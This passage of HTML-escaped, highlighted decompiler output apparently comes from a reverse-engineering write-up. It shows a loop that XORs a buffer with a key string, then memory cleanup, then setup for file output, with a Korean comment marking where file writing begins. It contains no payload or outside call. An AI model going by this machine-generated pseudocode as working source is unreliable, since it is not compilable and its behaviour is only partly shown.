          &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sub_402540&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block_1_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block_0_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_404130&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_401D40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                                       &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_404130&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_401D40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                                       &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1F&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;_invalid_parameter_noinfo_noreturn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;sub_4068E5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sub_404E00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sub_4050B0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;                                             &lt;span class=&quot;c1&quot;&gt;// 여기에서부터는 파일 입출력 수행&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ofstream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vftable&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_403300&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
